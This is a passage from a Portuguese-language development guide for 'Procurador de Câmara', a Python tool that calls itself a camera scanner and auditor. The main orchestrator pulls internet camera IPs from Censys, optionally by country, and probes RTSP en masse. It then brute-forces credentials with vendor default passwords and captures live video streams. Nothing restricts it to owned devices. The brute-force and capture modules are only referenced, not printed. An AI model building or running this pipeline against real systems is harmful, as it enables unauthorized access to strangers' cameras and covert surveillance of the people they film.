                cam.network = net
        return cameras


def enrich_with_geoip(camera: Camera, resolver: GeoIPResolver) -> Camera:
    """Resolver GeoIP para uma câmara (in-place)."""
    if camera.geo.country is None:
        geo, net = resolver.resolve(camera.ip)
        camera.geo = geo
        camera.network = net
    return camera
```

---

## 5.6 Config Loader

### `procurador/config.py`

```python
"""
Carregar configuração.
Prioridade: env vars > config.toml > defaults
"""
import os
import tomllib
from pathlib import Path
from dataclasses import asdict
from procurador.core.models import ScanConfig


def load_config(path: str | None = None) -> ScanConfig:
    """Carregar configuração de ficheiro TOML + env vars."""
    config = ScanConfig()

    if path is None:
        path = "config.toml"

    config_path = Path(path)
    if config_path.exists():
        with open(config_path, "rb") as f:
            data = tomllib.load(f)

        # Mapear TOML para ScanConfig
        censys_cfg = data.get("censys", {})
        config.censys_query = censys_cfg.get("default_query", config.censys_query)
        config.censys_max_pages = censys_cfg.get("max_pages", config.censys_max_pages)

        scan_cfg = data.get("scan", {})
        config.rtsp_probe_timeout = scan_cfg.get("rtsp_probe_timeout", config.rtsp_probe_timeout)
        config.rtsp_probe_concurrent = scan_cfg.get("rtsp_probe_concurrent", config.rtsp_probe_concurrent)
        config.brute_enabled = scan_cfg.get("brute_enabled", config.brute_enabled)
        config.brute_threads = scan_cfg.get("brute_threads", config.brute_threads)

        local_cfg = data.get("local", {})
        config.local_subnet = local_cfg.get("subnet", config.local_subnet)
        config.onvif_discovery = local_cfg.get("onvif_discovery", config.onvif_discovery)

    # Env vars override
    if os.environ.get("CENSYS_API_ID"):
        pass  # Usado diretamente nos módulos

    return config
```

---

## 5.7 Logger

### `procurador/utils/logger.py`

```python
"""
Logger estruturado para o Procurador.
Usa structlog para logs JSON ou rich para output colorido no terminal.
"""
import logging
import sys


def setup_logger(level: str = "INFO", json_output: bool = False) -> logging.Logger:
    """Configurar logger."""
    logger = logging.getLogger("procurador")
    logger.setLevel(getattr(logging, level.upper(), logging.INFO))

    if json_output:
        # Usar structlog para JSON
        try:
            import structlog
            structlog.configure(
                processors=[
                    structlog.stdlib.filter_by_level,
                    structlog.stdlib.add_logger_name,
                    structlog.stdlib.add_log_level,
                    structlog.processors.TimeStamper(fmt="iso"),
                    structlog.dev.ConsoleRenderer()
                ],
                wrapper_class=structlog.stdlib.BoundLogger,
                context_class=dict,
                logger_factory=structlog.PrintLoggerFactory(),
                cache_logger_on_first_use=True,
            )
            return structlog.get_logger("procurador")
        except ImportError:
            pass

    # Formato texto simples com cores
    handler = logging.StreamHandler(sys.stdout)
    formatter = logging.Formatter(
        "%(asctime)s | %(levelname)-8s | %(message)s",
        datefmt="%H:%M:%S",
    )
    handler.setFormatter(formatter)
    logger.addHandler(handler)

    return logger
```

---

## 5.8 Main (orquestrador)

### `procurador/__main__.py`

```python
"""
Entry point: python -m procurador

Orquestra o pipeline completo:
1. Recolher IPs (Censys)
2. RTSP probe
3. Brute force
4. GeoIP
5. Stream capture
6. Guardar resultados
"""
import argparse
import logging
import time
import sys
from pathlib import Path
from datetime import datetime

logger = logging.getLogger("procurador")

def main():
    parser = argparse.ArgumentParser(
        description="📹 Procurador de Câmara — Scanner e auditoria de câmaras IP",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  python -m procurador                              # Scan default (Censys RTSP)
  python -m procurador --country PT                  # Câmaras em Portugal
  python -m procurador --country Portugal --pages 10 # Mais resultados
  python -m procurador --tui                         # Com dashboard TUI
  python -m procurador --web                         # Com web dashboard
  python -m procurador --local                       # Scan da LAN apenas
  python -m procurador --no-brute                    # Sem brute force
  python -m procurador --no-stream                   # Sem captura de stream
        """
    )

    parser.add_argument("--country", "-c", default="",
                        help="País para filtrar (código ou nome)")
    parser.add_argument("--query", "-q", default="",
                        help="Query Censys personalizada")
    parser.add_argument("--pages", "-p", type=int, default=5,
                        help="Número de páginas Censys (default: 5)")
    parser.add_argument("--local", action="store_true",
                        help="Scan da rede local apenas")
    parser.add_argument("--no-brute", action="store_true",
                        help="Desativar brute force")
    parser.add_argument("--no-stream", action="store_true",
                        help="Desativar captura de stream")
    parser.add_argument("--tui", action="store_true",
                        help="Ativar dashboard TUI")
    parser.add_argument("--web", action="store_true",
                        help="Ativar web dashboard")
    parser.add_argument("--timeout", type=int, default=3,
                        help="Timeout para probe RTSP (default: 3s)")
    parser.add_argument("--concurrent", type=int, default=200,
                        help="Probes RTSP concorrentes (default: 200)")
    parser.add_argument("--debug", action="store_true",
                        help="Modo debug")
    parser.add_argument("--output", "-o", default="data",
                        help="Diretório de output (default: data/)")

    args = parser.parse_args()

    # Logging
    level = "DEBUG" if args.debug else "INFO"
    logging.basicConfig(
        level=getattr(logging, level),
        format="%(asctime)s | %(levelname)-8s | %(message)s",
        datefmt="%H:%M:%S",
    )

    logger.info("=" * 60)
    logger.info("📹 PROCURADOR DE CÂMERA v1.0")
    logger.info("=" * 60)

    # Config
    from procurador.config import load_config
    config = load_config()
    config.censys_country = args.country
    config.censys_query = args.query or config.censys_query
    config.censys_max_pages = args.pages
    config.rtsp_probe_timeout = args.timeout
    config.rtsp_probe_concurrent = args.concurrent
    config.brute_enabled = not args.no_brute
    config.stream_capture = not args.no_stream

    # Source
    source_name = "local" if args.local else "Censys"
    logger.info(f"📡 Source: {source_name}")
    if not args.local:
        logger.info(f"🔍 Query: {config.censys_query}")
        if config.censys_country:
            logger.info(f"🌍 País: {config.censys_country}")

    # --- PHASE 1: Collect IPs ---
    cameras = []
    if args.local:
        logger.info("🔍 Scanning local network...")
        from procurador.sources.local import scan_local
        cameras = list(scan_local(config))
    else:
        logger.info("🔍 Fetching from Censys...")
        from procurador.sources.censys import search_censys
        cameras = list(search_censys(config))

    if not cameras:
        logger.warning("⚠️ Nenhuma câmara encontrada")
        return

    logger.info(f"📊 Total IPs: {len(cameras)}")

    # --- PHASE 2: RTSP Probe ---
    logger.info("🔍 Probing RTSP...")
    from procurador.core.scanner import scan_batch
    cameras = scan_batch(cameras, config)
    live = sum(1 for c in cameras if c.status.value == "live")
    auth = sum(1 for c in cameras if c.status.value == "auth")
    logger.info(f"📊 Live: {live} | Auth needed: {auth}")

    # --- PHASE 3: Brute Force ---
    if config.brute_enabled and auth > 0:
        logger.info("🔑 Brute forcing credentials...")
        from procurador.core.brute import brute_batch
        cameras = brute_batch(cameras, threads=config.brute_threads, timeout=config.rtsp_probe_timeout)
        new_live = sum(1 for c in cameras if c.status.value == "live")
        logger.info(f"📊 After brute: {new_live} live")

    # --- PHASE 4: GeoIP ---
    logger.info("🌍 Resolving GeoIP...")
    from procurador.core.geoip import GeoIPResolver
    resolver = GeoIPResolver()
    for cam in cameras:
        if cam.geo.country is None:
            from procurador.core.geoip import enrich_with_geoip
            enrich_with_geoip(cam, resolver)

    # --- PHASE 5: Stream Capture ---
    if config.stream_capture:
        logger.info("📸 Capturing streams...")
        from procurador.core.stream import capture_batch
        cameras = capture_batch(cameras, config)

    # --- PHASE 6: Save ---
    from procurador.core.models import ScanResult
    result = ScanResult(
        scan_id=datetime.now().strftime("scan_%Y%m%d_%H%M%S"),
        config=config,
        started_at=time.time(),
        cameras=cameras,
    )
    result.finished_at = time.time()
    result.calculate_stats()

    # Save JSON
    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)
    json_path = output_dir / f"{result.scan_id}.json"
    result.to_json(str(json_path))
    logger.info(f"💾 Results saved to {json_path}")

    # Summary
    logger.info("=" * 60)
    logger.info("📊 RESUMO FINAL")
    logger.info(f"   Total IPs:     {result.total_ips}")
    logger.info(f"   🟢 Live:       {result.accessible}")
    logger.info(f"   🟡 Auth:       {result.auth_required}")
    logger.info(f"   🔴 Closed:     {result.closed}")
    logger.info(f"   ❌ Errors:     {result.errors}")
    logger.info(f"   📸 Streams:    {result.live_streams}")
    if result.vendors:
        logger.info(f"   🏭 Top vendors: {list(result.vendors.keys())[:5]}")
    if result.countries:
        logger.info(f"   🌍 Top países:  {list(result.countries.keys())[:5]}")
    logger.info("=" * 60)

    # --- TUI Dashboard ---
    if args.tui:
        from procurador.ui.tui import run_dashboard
        run_dashboard(result)

    # --- Web Dashboard ---
    if args.web:
        from procurador.ui.web.app import run_web
        logger.info("🌐 Starting web dashboard...")
        run_web(result)

    logger.info("✅ Done.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("\n⏹️  Interrompido pelo utilizador")
        sys.exit(0)
    except Exception as e:
        logger.error(f"💥 Erro fatal: {e}", exc_info=True)
        sys.exit(1)
```

---

## 5.9 Checklist da Fase 1

- [ ] `models.py` com todas as dataclasses + enums
- [ ] `censys.py` com search + parse (testado com API real)
- [ ] `scanner.py` com probe RTSP (testado com câmara real ou mock)
- [ ] `brute.py` com default creds por fabricante
- [ ] `geoip.py` com resolver (testado com ipinfo.io)
- [ ] `config.py` com loader TOML + env vars
- [ ] `__main__.py` com pipeline completo
- [ ] `python -m procurador` corre sem erros
- [ ] Resultados guardados em JSON
- [ ] Logging a funcionar
- [ ] KeyboardInterrupt funciona
- [ ] `ruff check` limpo
- [ ] `mypy` sem erros

---

> Seguir para o documento 06 — FASE 2: DASHBOARD
